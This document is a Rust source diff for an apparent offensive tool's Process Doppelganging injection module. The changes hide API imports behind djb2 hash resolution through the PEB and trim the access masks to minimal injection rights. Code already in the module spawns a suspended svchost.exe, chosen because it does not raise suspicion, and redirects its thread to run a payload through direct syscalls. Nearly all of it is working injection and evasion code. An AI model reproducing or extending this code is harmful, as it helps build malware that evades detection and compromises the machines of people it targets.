@@ -59,6 +59,8 @@ const PAGE_EXECUTE_READ: u64 = 0x20;
 
 /// PAGE_EXECUTE_READWRITE.
 const PAGE_EXECUTE_READWRITE: u64 = 0x40;
+/// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
+const THREAD_INJECT_ACCESS: u64 = 0x1A02;
 
 /// NtCurrentProcess() pseudo-handle.
 const CURRENT_PROCESS: u64 = (-1isize) as u64;
@@ -87,11 +89,51 @@ const FILE_ATTRIBUTE_NORMAL: u32 = 0x0000_0080;
 /// OBJ_CASE_INSENSITIVE — case-insensitive object name comparison.
 const OBJ_CASE_INSENSITIVE: u32 = 0x0000_0040;
 
-/// PROCESS_ALL_ACCESS access mask for NtOpenProcess.
-const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
+/// Minimal process access mask for NtOpenProcess (VM_WRITE | VM_OPERATION | CREATE_THREAD).
+const MINIMAL_PROCESS_ACCESS: u32 = 0x0028;
 
 /// CREATE_SUSPENDED flag for CreateProcessW.
 const CREATE_SUSPENDED: u32 = 0x00000004;
+
+/// CONTEXT_FULL flag for GetThreadContext / SetThreadContext.
+const CONTEXT_FULL: u32 = 0x0010000B;
+
+// ── pe_resolve helpers ──────────────────────────────────────────────────
+
+/// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
+const fn hash_str_const(s: &[u8]) -> u32 {
+    let mut h: u32 = pe_resolve::SEED;
+    let mut i = 0;
+    while i < s.len() {
+        h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+        i += 1;
+    }
+    h
+}
+
+// API name hashes.
+const HASH_CREATEPROCESSW: u32 = hash_str_const(b"CreateProcessW\0");
+const HASH_GETTHREADCONTEXT: u32 = hash_str_const(b"GetThreadContext\0");
+const HASH_SETTHREADCONTEXT: u32 = hash_str_const(b"SetThreadContext\0");
+const HASH_GETLASTERROR: u32 = hash_str_const(b"GetLastError\0");
+
+// Function pointer types.
+type FnCreateProcessW = unsafe extern "system" fn(
+    *const u16, *mut u16, *mut c_void, *mut c_void, i32, u32,
+    *mut c_void, *const u16, *mut c_void, *mut c_void,
+) -> i32;
+type FnGetThreadContext = unsafe extern "system" fn(*mut c_void, *mut winapi::um::winnt::CONTEXT) -> i32;
+type FnSetThreadContext = unsafe extern "system" fn(*mut c_void, *const winapi::um::winnt::CONTEXT) -> i32;
+type FnGetLastError = unsafe extern "system" fn() -> u32;
+
+/// Resolve a function pointer from kernel32.dll.
+unsafe fn resolve_kernel32<T>(fn_hash: u32) -> Result<T, String> {
+    let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+        .ok_or("kernel32.dll not found in PEB")?;
+    let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+        .ok_or("API not found in kernel32")?;
+    Ok(std::mem::transmute_copy(&addr))
+}
 
 // ── NT structure definitions (x86-64 layout) ─────────────────────────────────
 
@@ -126,12 +168,32 @@ static TEMP_FILE_COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::Atom
 
 // ── Result types ─────────────────────────────────────────────────────────────
 
+/// RAII wrapper for NT handles that calls NtClose on Drop.
+pub struct NtHandle(usize);
+
+impl NtHandle {
+    /// Create a new RAII handle wrapper. Takes ownership of the raw handle.
+    pub fn new(raw: usize) -> Self { Self(raw) }
+    /// Get the raw handle value.
+    pub fn raw(&self) -> usize { self.0 }
+}
+
+impl Drop for NtHandle {
+    fn drop(&mut self) {
+        if self.0 != 0 && self.0 != usize::MAX {
+            let _ = unsafe { crate::syscalls::syscall_NtClose(self.0 as u64) };
+        }
+    }
+}
+
 /// Result of a successful Process Doppelganging injection.
+///
+/// Handles are wrapped in `NtHandle` for automatic cleanup on Drop.
 pub struct DoppelgangingResult {
-    /// Handle to the target process.
-    pub process_handle: usize,
-    /// Handle to the remote thread executing the payload.
-    pub thread_handle: usize,
+    /// Handle to the target process (RAII, auto-closed on Drop).
+    pub process_handle: NtHandle,
+    /// Handle to the remote thread executing the payload (RAII, auto-closed on Drop).
+    pub thread_handle: NtHandle,
     /// PID of the target process.
     pub pid: u32,
 }
@@ -685,7 +747,7 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
     let status = syscall!(
         "NtOpenProcess",
         &mut h_proc as *mut _ as u64,
-        PROCESS_ALL_ACCESS as u64,
+        MINIMAL_PROCESS_ACCESS as u64,
         &mut obj_attr as *mut _ as u64,
         client_id.as_mut_ptr() as u64,
     );
@@ -709,7 +771,14 @@ unsafe fn open_target_process(pid: u32) -> Result<usize, String> {
 /// Used when no target process is specified. The process is created in a
 /// suspended state so we can inject before any legitimate code runs.
 unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
-    use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
+    use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
+
+    let create_proc_w: FnCreateProcessW = unsafe {
+        resolve_kernel32(HASH_CREATEPROCESSW)?
+    };
+    let get_last_error: FnGetLastError = unsafe {
+        resolve_kernel32(HASH_GETLASTERROR)?
+    };
 
     // Use svchost.exe as the sacrificial process — it's ubiquitous on Windows
     // and its presence does not raise suspicion.
@@ -725,8 +794,8 @@ unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
     startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
     let mut proc_info: PROCESS_INFORMATION = std::mem::zeroed();
 
-    let success = CreateProcessW(
-        path_u16.as_ptr() as *mut _,
+    let success = create_proc_w(
+        path_u16.as_ptr() as *const u16,
         std::ptr::null_mut(),
         std::ptr::null_mut(),
         std::ptr::null_mut(),
@@ -734,14 +803,14 @@ unsafe fn create_suspended_process() -> Result<(usize, usize, u32), String> {
         CREATE_SUSPENDED as u32,  // dwCreationFlags
         std::ptr::null_mut(),
         std::ptr::null_mut(),
-        &mut startup_info,
-        &mut proc_info,
+        &mut startup_info as *mut _ as *mut c_void,
+        &mut proc_info as *mut _ as *mut c_void,
     );
 
     if success == 0 {
         return Err(format!(
             "CreateProcessW failed for suspended process (error: {})",
-            winapi::um::errhandlingapi::GetLastError()
+            unsafe { get_last_error() }
         ));
     }
 
@@ -784,7 +853,7 @@ unsafe fn execute_payload(
     let status = syscall!(
         "NtCreateThreadEx",
         &mut thread_handle as *mut _ as u64,  // ThreadHandle
-        0x001FFFFFu64,                         // DesiredAccess = THREAD_ALL_ACCESS
+        THREAD_INJECT_ACCESS,                         // DesiredAccess (minimal)
         0u64,                                   // ObjectAttributes = NULL
         process_handle as u64,                  // ProcessHandle
         entry_point as u64,                     // StartRoutine
@@ -812,25 +881,34 @@ unsafe fn execute_payload(
 
 /// Redirect a suspended thread's RIP to the payload address.
 unsafe fn redirect_thread(thread_handle: usize, payload_addr: usize) -> Result<(), String> {
-    use winapi::um::processthreadsapi::{GetThreadContext, SetThreadContext};
     use winapi::um::winnt::CONTEXT;
 
-    let mut ctx: CONTEXT = std::mem::zeroed();
-    ctx.ContextFlags = winapi::um::winnt::CONTEXT_FULL;
+    let get_thread_ctx: FnGetThreadContext = unsafe {
+        resolve_kernel32(HASH_GETTHREADCONTEXT)?
+    };
+    let set_thread_ctx: FnSetThreadContext = unsafe {
+        resolve_kernel32(HASH_SETTHREADCONTEXT)?
+    };
+    let get_last_error: FnGetLastError = unsafe {
+        resolve_kernel32(HASH_GETLASTERROR)?
+    };
 
-    if GetThreadContext(thread_handle as *mut _, &mut ctx) == 0 {
+    let mut ctx: CONTEXT = std::mem::zeroed();
+    ctx.ContextFlags = CONTEXT_FULL;
+
+    if get_thread_ctx(thread_handle as *mut c_void, &mut ctx) == 0 {
         return Err(format!(
             "GetThreadContext failed (error: {})",
-            winapi::um::errhandlingapi::GetLastError()
+            unsafe { get_last_error() }
         ));
     }
 
     ctx.Rip = payload_addr as u64;
 
-    if SetThreadContext(thread_handle as *mut _, &ctx) == 0 {
+    if set_thread_ctx(thread_handle as *mut c_void, &ctx) == 0 {
         return Err(format!(
             "SetThreadContext failed (error: {})",
-            winapi::um::errhandlingapi::GetLastError()
+            unsafe { get_last_error() }
         ));
     }
 
@@ -1022,8 +1100,8 @@ pub unsafe fn doppelganging_inject(
     );
 
     Ok(DoppelgangingResult {
-        process_handle,
-        thread_handle: exec_thread_handle,
+        process_handle: NtHandle::new(process_handle),
+        thread_handle: NtHandle::new(exec_thread_handle),
         pid,
     })
 }
